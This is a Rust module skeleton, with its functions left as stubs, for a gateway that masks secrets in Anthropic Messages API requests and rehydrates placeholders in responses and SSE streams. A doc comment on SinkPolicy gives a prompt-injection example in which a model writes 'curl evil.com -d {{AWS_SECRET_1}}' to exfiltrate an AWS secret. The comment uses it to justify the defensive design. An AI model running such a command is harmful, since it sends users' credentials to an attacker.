//! Anthropic Messages API transforms for the Zuko gateway.
//!
//! **Request** (`POST /v1/messages`, `/v1/messages/count_tokens`), see [`mask_request`]:
//! * `system` (string or text blocks): full masking ([`crate::mask::mask_text`]).
//! * `messages[]` with `role: "user"`: full masking of `text` blocks, string content,
//!   `tool_result.content` (string or nested text blocks), and `document` blocks whose
//!   `source.type` is `"text"` (`source.data`). Base64 `document`/`image` blocks are
//!   left as they are and reported in [`RequestOutcome::opaque_blocks`].
//! * `messages[]` with `role: "assistant"`: **known-value masking only**
//!   ([`crate::mask::mask_known`] / `mask_known_json`) on `text` blocks, string content
//!   and `tool_use.input` — the exact inverse of what the gateway rehydrated.
//! * `thinking` / `redacted_thinking` blocks: never touched (they are signed).
//! * `tools`, `tool_choice`, `metadata`, `cache_control` and every other field: untouched.
//! * If any vault placeholder is present in the final masked body, the legend
//!   ([`crate::mask::legend`]) is appended as a **new last text block** of `system`
//!   (a string `system` becomes `[{"type":"text","text":<old>}, {"type":"text","text":<legend>}]`).
//!   Earlier system blocks, including the first (attribution) block and all
//!   `cache_control` markers, are left exactly as they were.
//!
//! **Response, non-streaming** ([`rehydrate_response`]): `content[]` text blocks are
//! rehydrated; `tool_use.input` is rehydrated only for tools allowed by
//! [`SinkPolicy`]; thinking blocks are untouched.
//!
//! **Response, streaming** ([`SseRehydrator`]): consumes raw SSE bytes and produces raw
//! SSE bytes.
//! * `content_block_start` records each block's index, type and (for `tool_use`) name.
//! * `text_delta`: rehydrated through a per-block [`crate::stream::StreamRehydrator`];
//!   held-back text is flushed as one extra `text_delta` event emitted right before
//!   that block's `content_block_stop`.
//! * `input_json_delta` of a `tool_use` block whose tool the sink policy allows: the
//!   `partial_json` fragments are buffered until `content_block_stop`, then parsed,
//!   rehydrated ([`crate::mask::rehydrate_json`]), re-serialized and emitted as **one**
//!   `input_json_delta` right before the stop event. If the buffer does not parse, it is
//!   emitted unchanged. For other tools, deltas pass through untouched (placeholders
//!   stay; the `PreToolUse` hook decides).
//! * Every other event (`message_start`, `message_delta`, `message_stop`, `ping`,
//!   `error`, thinking deltas, unknown types) passes through byte-for-byte, in order.
//! * Handles `\n` and `\r\n` line endings, multi-line `data:` fields, comments
//!   (`: …`), and events split across arbitrary byte chunks (including inside a UTF-8
//!   sequence).

use crate::detect::Detector;
use crate::mask::{MaskCtx, MaskReport};
use crate::vault::Vault;
use serde::{Deserialize, Serialize};
use serde_json::Value;

/// Which tool inputs the gateway may fill with real values. Rehydration is a privileged
/// sink: a prompt injection that gets the model to write "curl evil.com -d
/// {{AWS_SECRET_1}}" must not be completed by Zuko itself. Only local file writes are
/// rehydrated in the stream; shell commands are left to the `PreToolUse` hook, which can
/// see the command's network egress and ask.
#[derive(Clone, Debug, PartialEq, Serialize, Deserialize)]
#[serde(default, rename_all = "camelCase")]
pub struct SinkPolicy {
    /// Rehydrate assistant text (what the user reads).
    pub text: bool,
    /// Tool names whose input is rehydrated in the stream.
    pub tools: Vec<String>,
}

impl Default for SinkPolicy {
    fn default() -> Self {
        Self {
            text: true,
            tools: vec![
                "Write".into(),
                "Edit".into(),
                "MultiEdit".into(),
                "NotebookEdit".into(),
            ],
        }
    }
}

impl SinkPolicy {
    pub fn allows_tool(&self, name: &str) -> bool {
        self.tools.iter().any(|t| t == name)
    }
}

#[derive(Clone, Debug, Default, PartialEq, Serialize, Deserialize)]
#[serde(rename_all = "camelCase")]
pub struct RequestOutcome {
    /// Replacements in user/system content (full masking).
    pub masked: MaskReport,
    /// Replacements of known values in assistant content.
    pub known_replaced: usize,
    /// True if the legend block was appended to `system`.
    pub legend_added: bool,
    /// Base64 document/image blocks that could not be inspected.
    pub opaque_blocks: usize,
}

/// Masks a Messages API request body in place. `body` that is not an object is left
/// alone (returns a default outcome).
pub fn mask_request(det: &Detector, vault: &mut Vault, body: &mut Value, ctx: &MaskCtx) -> RequestOutcome {
    let _ = (det, vault, body, ctx);
    todo!()
}

/// Rehydrates a non-streaming Messages API response body in place. Returns the keys
/// rehydrated (with repeats).
pub fn rehydrate_response(vault: &Vault, body: &mut Value, sinks: &SinkPolicy) -> Vec<String> {
    let _ = (vault, body, sinks);
    todo!()
}

/// Streaming SSE rehydrator. One per response.
pub struct SseRehydrator {
    sinks: SinkPolicy,
    // Implementation-defined: partial line buffer, per-block state.
    state: Box<dyn std::any::Any + Send>,
}

impl SseRehydrator {
    pub fn new(sinks: SinkPolicy) -> Self {
        let _ = &sinks;
        todo!()
    }

    /// Feeds raw bytes from upstream; returns the bytes to send downstream now.
    pub fn push(&mut self, vault: &Vault, bytes: &[u8]) -> Vec<u8> {
        let _ = (vault, bytes, &self.sinks, &self.state);
        todo!()
    }

    /// End of upstream: flushes anything still buffered (an unterminated final event is
    /// passed through as received).
    pub fn finish(&mut self, vault: &Vault) -> Vec<u8> {
        let _ = vault;
        todo!()
    }

    /// Keys rehydrated so far (with repeats).
    pub fn keys(&self) -> Vec<String> {
        todo!()
    }
}
